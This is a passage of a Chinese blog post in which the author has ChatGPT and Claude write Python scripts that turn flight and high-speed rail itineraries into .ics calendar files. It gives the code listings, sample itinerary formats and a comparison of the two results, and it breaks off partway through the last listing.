+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001942913.png" alt="整理代码"></p>
+<p>使用修改后的代码继续尝试，还是没达到效果，将输出结果发给它，继续调整</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423002235114.png" alt="继续优化代码"></p>
+<p>经过比多次调教，最终给出代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">ics = <span class="string">&quot;BEGIN:VCALENDAR\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;PRODID:flight\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;VERSION:2.0\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;CALSCALE:GREGORIAN\n&quot;</span></span><br><span class="line"></span><br><span class="line">flight_info = []</span><br><span class="line">event_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;demo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read().strip()</span><br><span class="line">    flights = content.split(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> flight <span class="keyword">in</span> flights:</span><br><span class="line">        flight_info = flight.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打印航班信息,确认是否准确</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;航班信息: <span class="subst">&#123;flight_info&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        name = flight_info[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 打印航班名称</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flight_info) &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;航班信息不完整!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析出机场和时间信息</span></span><br><span class="line">        airport = flight_info[<span class="number">1</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;起飞机场: <span class="subst">&#123;airport[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        depart_airport = <span class="string">&#x27; &#x27;</span>.join(airport[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        depart_time = flight_info[<span class="number">2</span>]</span><br><span class="line">        depart_time = datetime.datetime.strptime(depart_time, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;起飞时间: <span class="subst">&#123;depart_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        airport = flight_info[<span class="number">3</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;到达机场: <span class="subst">&#123;airport[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        arrive_airport = <span class="string">&#x27; &#x27;</span>.join(airport[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        arrive_time = flight_info[<span class="number">4</span>]</span><br><span class="line">        arrive_time = datetime.datetime.strptime(arrive_time, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;到达时间: <span class="subst">&#123;arrive_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成VEVENT事件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ics += <span class="string">f&quot;BEGIN:VEVENT\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;depart_airport&#125;</span>@<span class="subst">&#123;arrive_airport&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;DTSTART;TZID=Asia/Shanghai:<span class="subst">&#123;depart_time.strftime(<span class="string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;DTEND;TZID=Asia/Shanghai:<span class="subst">&#123;arrive_time.strftime(<span class="string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;SUMMARY:<span class="subst">&#123;name&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">f&quot;LOCATION:<span class="subst">&#123;depart_airport&#125;</span> -&gt; <span class="subst">&#123;arrive_airport&#125;</span>\n&quot;</span></span><br><span class="line">            ics += <span class="string">&quot;END:VEVENT\n&quot;</span></span><br><span class="line"></span><br><span class="line">            event_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;生成VEVENT失败:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            logging.exception(e)</span><br><span class="line"></span><br><span class="line">ics += <span class="string">&quot;END:VCALENDAR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果成功生成了至少一个事件，就写入文件</span></span><br><span class="line"><span class="keyword">if</span> event_count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.ics&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ics)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有生成任何事件，无法写入到文件&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-2-高铁信息"><a href="#3-2-高铁信息" class="headerlink" title="3.2 高铁信息"></a>3.2 高铁信息</h3><p>告知Claude，需要在原代码基础上添加识别高铁信息的功能。</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423132937903.png" alt="添加识别高铁信息"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">ics = <span class="string">&quot;BEGIN:VCALENDAR\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;PRODID:transport\n&quot;</span>   <span class="comment"># 修改为transport</span></span><br><span class="line">ics += <span class="string">&quot;VERSION:2.0\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;CALSCALE:GREGORIAN\n&quot;</span></span><br><span class="line"></span><br><span class="line">info = []  </span><br><span class="line">event_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;demo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read().strip()</span><br><span class="line">    transports = content.split(<span class="string">&quot;\n\n&quot;</span>)  <span class="comment"># 修改为transports</span></span><br><span class="line">    <span class="keyword">for</span> transport <span class="keyword">in</span> transports:</span><br><span class="line">        info = transport.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 判断是航班还是高铁</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> info[<span class="number">0</span>] <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> info[<span class="number">0</span>]:  </span><br><span class="line">           <span class="comment"># 高铁信息  </span></span><br><span class="line">           name = info[<span class="number">0</span>]</span><br><span class="line">           <span class="comment"># 起始站</span></span><br><span class="line">           start_station = info[<span class="number">1</span>] </span><br><span class="line">           <span class="comment"># 出发时间  </span></span><br><span class="line">           depart_time = info[<span class="number">2</span>]</span><br><span class="line">           depart_time = datetime.datetime.strptime(depart_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">           <span class="comment"># 终点站</span></span><br><span class="line">           end_station = info[<span class="number">3</span>] </span><br><span class="line">           <span class="comment"># 到达时间</span></span><br><span class="line">           arrive_time = info[<span class="number">4</span>]</span><br><span class="line">           arrive_time = datetime.datetime.strptime(arrive_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)           </span><br><span class="line">           </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           <span class="comment"># 航班信息(代码省略)  </span></span><br><span class="line">           ...</span><br><span class="line">           </span><br><span class="line">        <span class="comment"># 生成VEVENT事件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ics += <span class="string">f&quot;BEGIN:VEVENT\n&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> name:  <span class="comment"># 判断是高铁还是航班</span></span><br><span class="line">                ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;start_station&#125;</span>@<span class="subst">&#123;end_station&#125;</span>\n&quot;</span>  <span class="comment"># 修改机场为站点          </span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;depart_airport&#125;</span>@<span class="subst">&#123;arrive_airport&#125;</span>\n&quot;</span>  </span><br><span class="line">            ...   <span class="comment"># 其他代码不变</span></span><br><span class="line">           </span><br><span class="line">            event_count += <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            ...   <span class="comment"># 日志记录异常代码不变</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 后续代码不变 </span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但一眼看出它将原有的 <strong>ics +&#x3D; “PRODID:flight\n”</strong> 修改为了 <strong>ics +&#x3D; “PRODID:transport\n”</strong></p>
+<p>明显不符合我的要求，于是重新把我的需求告诉它，现在看上去是理解了我的需求了。</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423133500216.png" alt="重新说明需求"></p>
+<p>给出代码后还给出了本次代码修改特点，可谓是很贴心了🤣</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423133600798.png" alt="修改特点"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">ics = <span class="string">&quot;BEGIN:VCALENDAR\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;PRODID:transport\n&quot;</span>    </span><br><span class="line">ics += <span class="string">&quot;VERSION:2.0\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;CALSCALE:GREGORIAN\n&quot;</span></span><br><span class="line"></span><br><span class="line">info = []  </span><br><span class="line">event_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;demo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read().strip()</span><br><span class="line">    transports = content.split(<span class="string">&quot;\n\n&quot;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> transport <span class="keyword">in</span> transports:</span><br><span class="line">        info = transport.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 先判断是航班还是高铁,然后分别处理</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> info[<span class="number">0</span>] <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> info[<span class="number">0</span>]:  </span><br><span class="line">           <span class="comment"># 高铁信息  </span></span><br><span class="line">           ... </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           <span class="comment"># 航班信息 </span></span><br><span class="line">           ...  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># 生成VEVENT事件</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ics += <span class="string">f&quot;BEGIN:VEVENT\n&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&#x27;动车&#x27;</span> <span class="keyword">in</span> name:  </span><br><span class="line">                ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;start_station&#125;</span>@<span class="subst">&#123;end_station&#125;</span>\n&quot;</span>              </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ics += <span class="string">f&quot;UID:<span class="subst">&#123;name&#125;</span>@<span class="subst">&#123;depart_airport&#125;</span>@<span class="subst">&#123;arrive_airport&#125;</span>\n&quot;</span>  </span><br><span class="line">            ...   <span class="comment"># 其他代码不变</span></span><br><span class="line">           </span><br><span class="line">            event_count += <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            ...   <span class="comment"># 日志记录异常代码不变</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 后续代码不变 </span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行修正后的代码，成功生产ics文件</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423134407410.png" alt="Claude生产的ics"></p>
+<h2 id="四、-效果对比"><a href="#四、-效果对比" class="headerlink" title="四、 效果对比"></a>四、 效果对比</h2><p>然后给出与chatgpt生成的ics对比</p>
+<ul>
+<li><p>Claude</p>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423114845740.png" alt="Claude效果"></p>
+</li>
+</ul>
+<p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423114918310.png" alt="Chatgpt效果"></p>
+<h3 id="4-1-最终代码"><a href="#4-1-最终代码" class="headerlink" title="4.1 最终代码"></a>4.1 最终代码</h3><p>贴上Chatgpt和Claude生成的代码</p>
+<h4 id="4-1-1-Chatgpt"><a href="#4-1-1-Chatgpt" class="headerlink" title="4.1.1 Chatgpt"></a>4.1.1 Chatgpt</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_ics</span>(<span class="params">travel_info</span>):</span><br><span class="line">    regex = <span class="string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span></span><br><span class="line">    train_regex = <span class="string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+到达时间\s+(\S+\s+\S+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(regex, travel_info)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">match</span> = re.search(train_regex, travel_info)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: failed to match travel information.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        travel_type = <span class="string">&quot;高铁/动车&quot;</span></span><br><span class="line">        train_no, dep_station, dep_time, arr_station, arr_time = <span class="keyword">match</span>.groups()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        travel_type = <span class="string">&quot;航班&quot;</span></span><br><span class="line">        airline, dep_airport, dep_time, arr_airport, arr_time = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成ICS字符串</span></span><br><span class="line">    start_time = datetime.strptime(dep_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">    end_time = datetime.strptime(arr_time, <span class="string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)</span><br><span class="line">    uid = <span class="string">f&#x27;<span class="subst">&#123;travel_type&#125;</span>-<span class="subst">&#123;start_time.date()&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> travel_type == <span class="string">&quot;航班&quot;</span>:</span><br><span class="line">        summary = <span class="string">f&#x27;<span class="subst">&#123;airline&#125;</span> <span class="subst">&#123;uid&#125;</span>&#x27;</span></span><br><span class="line">        location = dep_airport</span><br><span class="line">        description = <span class="string">f&#x27;<span class="subst">&#123;airline&#125;</span> 将于<span class="subst">&#123;dep_time&#125;</span>从<span class="subst">&#123;dep_airport&#125;</span>出发，预计于<span class="subst">&#123;arr_time&#125;</span>到达<span class="subst">&#123;arr_airport&#125;</span>。&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> travel_type == <span class="string">&quot;高铁/动车&quot;</span>:</span><br><span class="line">        summary = <span class="string">f&#x27;<span class="subst">&#123;train_no&#125;</span> <span class="subst">&#123;uid&#125;</span>&#x27;</span></span><br><span class="line">        location = dep_station</span><br><span class="line">        description = <span class="string">f&#x27;<span class="subst">&#123;train_no&#125;</span> 将于<span class="subst">&#123;dep_time&#125;</span>从<span class="subst">&#123;dep_station&#125;</span>出发，预计于<span class="subst">&#123;arr_time&#125;</span>到达<span class="subst">&#123;arr_station&#125;</span>。&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unknown travel type.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ics_str = <span class="string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Travel Schedule//EN\nBEGIN:VEVENT\nUID:<span class="subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="subst">&#123;datetime.utcnow().strftime(<span class="string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="subst">&#123;start_time.strftime(<span class="string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="subst">&#123;end_time.strftime(<span class="string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:<span class="subst">&#123;summary&#125;</span>\nLOCATION:<span class="subst">&#123;location&#125;</span>\nDESCRIPTION:<span class="subst">&#123;description&#125;</span>\nEND:VEVENT\nEND:VCALENDAR&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ics_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取行程信息</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Flight.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    travel_info = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为ICS字符串</span></span><br><span class="line">ics_str = convert_to_ics(travel_info)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ICS字符串写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.ics&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ics_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Flight.txt的格式</p>
+<ul>
+<li>航班信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">厦门航空 MF8415</span><br><span class="line">杭州萧山机场T3</span><br><span class="line">出发时间 2023/05/04 15:20</span><br><span class="line">重庆江北机场T3</span><br><span class="line">到达时间 2023/05/04 17:45</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>高铁信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">高铁/动车 G158</span><br><span class="line">杭州东站</span><br><span class="line">出发时间 2023/05/04 16:13</span><br><span class="line">上海虹桥站</span><br><span class="line">到达时间 2023/05/04 17:12</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4-1-2-Claude"><a href="#4-1-2-Claude" class="headerlink" title="4.1.2 Claude"></a>4.1.2 Claude</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">ics = <span class="string">&quot;BEGIN:VCALENDAR\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;PRODID:transport\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;VERSION:2.0\n&quot;</span></span><br><span class="line">ics += <span class="string">&quot;CALSCALE:GREGORIAN\n&quot;</span></span><br><span class="line"></span><br><span class="line">info = []</span><br><span class="line">event_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;demo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read().strip()</span><br><span class="line">    transports = content.split(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> transport <span class="keyword">in</span> transports:</span><br><span class="line">        info = transport.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 先判断是航班还是高铁,然后分别处理</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;高铁&#x27;</span> <span class="keyword">in</span> info[<span 